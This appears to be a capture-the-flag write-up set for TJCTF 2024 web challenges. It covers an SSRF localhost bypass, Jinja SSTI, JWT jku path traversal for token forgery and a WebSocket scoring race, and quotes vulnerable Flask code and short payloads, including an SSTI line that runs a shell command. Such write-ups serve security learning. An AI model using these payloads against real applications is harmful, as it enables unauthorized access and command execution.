---
title: TJCTF 2024 Writeups
contest: TJCTF
year: 2024
difficulty: medium
vuln_type: web_unknown
tags: [ssrf-localhost, jwt-jku, file-upload, jinja-ssti, race-condition, websocket-spoof]
attack_chain:
- 1.monitor: 路由 /secret-frogger-78570618/ 拿到提示
- app.route("/monitor") 检查 request.remote_addr in ('localhost', '127.0.0.1')
- 2. 路由 /flag: req.ip !== '::ffff:127.0.0.1' && req.ip !== '::1' && req.ip !== '127.0.0.1' 校验
- /fetch 路由：URL 校验 https?:// 但 host.includes('localhost') 拒
- 但用 0.0.0.0 / 127.0.0.1 IP 形式 bypass
- 3. jinja SSTI：add_template_key 设 key=value 改 template_keys 字典
- /template POST 模板字符串 → re 匹配 {{key}} → 替换
- flag 字符串禁止 (403)，但 ssti 可以从 class chain 拿
- 4. JWT jku：verify_token 读 header.jku 路径 static/{jku}
- 路径穿越 static/../uploads/<uuid>/<file>
- 上传 jwk 格式公钥 + 生成 EC 私钥签名 token
- 5. playlist: render_template_string username 拼到 playlist.html
- 文件名 uuid 写盘 → /view_playlist/<uuid>.html 触发 SSTI
- 6. Kaboom websocket: 抢答类游戏 send_time >= time 检查绕过
- i==0 时 edit_score(0) 重置; 然后用 user2/user1 交替得 1000 分
key_payload: jwt.encode + jku='../uploads/<uuid>/<file>'  # 路径穿越 jku
one_liner: TJCTF 2024 多类 (Web/Reverse/Forensics)：JWT jku 路径穿越 + Flask SSTI + WebSocket 抢答。
lesson: JWT jku 字段直接拼到文件系统路径时，../ 序列允许加载攻击者控制的公钥 → 签名伪造。
quality: high
---
# TJCTF 2024 Writeups

## 1. monitor (Flask SSRF)
```python
@app.route("/monitor")
def monitor():
    if request.remote_addr in ("localhost", "127.0.0.1"):
        return render_template("admin.html", message=flag, errors="".join(log) or "No recent errors")
    else:
        return render_template("admin.html", message="Unauthorized access", errors="")
```
- 配合 /fetch 路由的 SSRF 调 /monitor 拿 flag

## 2. jinja SSTI
```python
template_keys = {
    'flag': flag, 'title': 'my website', 'content': 'Hello, {{name}}!', 'name': 'player'
}
@app.route('/add', methods=['POST'])
def add_template_key():
    key = request.form['key']; value = request.form['value']
    template_keys[key] = value
    return redirect('/?msg=Key+added!')

@app.route('/template', methods=['POST'])
def template_route():
    s = request.form['template']
    s = template(s)
    if flag in s[0]: return 'No flag for you!', 403
    else: return s
```
- `/add` POST 覆盖 name=`, ssti class chain`
- `/template` POST 模板字符串触发 SSTI

## 3. JWT jku 路径穿越
```python
def verify_token(token):
    header = jwt.get_unverified_header(token)
    jku = header["jku"]
    with open(f"static/{jku}", "r") as f:
        keys = json.load(f)["keys"]
    kid = header["kid"]
    for key in keys:
        if key["kid"] == kid:
            public_key = jwt.algorithms.ECAlgorithm.from_jwk(key)
            payload = jwt.decode(token.encode(), public_key, algorithms=["ES256"])
            return payload
```
- 上传 jwk 公钥到 `uploads/<uid>/<fid>`
- `jku = '../uploads/0d251448-ac71-4a1d-b702-136b1f2ad17d/bda5c410-...'`
- 用自己私钥签 `{"id": "admin"}`

## 4. playlist
```python
@app.route("/create_playlist", methods=["POST"])
def post_playlist():
    username = request.form["username"]
    filled = render_template("playlist.html", username=username, songs=text)
    this_id = str(uuid.uuid4())
    with open(f"templates/uploads/{this_id}.html", "w") as f:
        f.write(filled)
    return ...

@app.route("/view_playlist/")
def view_playlist(name):
    name = str(name)
    return render_template(f"uploads/{name}.html")
```
- `username={{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}`
- 写盘 → render 触发 SSTI

## 5. Kaboom WebSocket
```python
if (scores := get_room_scores(room_id)) is not None and send_time >= time():
    sock.send(b64encode(json.dumps({'scores': scores, 'end': True, 'message': '???'}).encode()))
    return
if i == 0: edit_score(scores, room_id, data['id'], 0)
if data['answer'] == q['answer']:
    edit_score(scores, room_id, data['id'], get_score(scores, room_id, data['id']) + 1000 + max((send_time - recv_time) * 50, -500))
```
- 第一次答 (i==0) 强制重置分数为 0
- 后续用 user2/user1 交替答，绕过单一用户得分
- `get_score() >= 1000 * len(questions)` 拿 flag
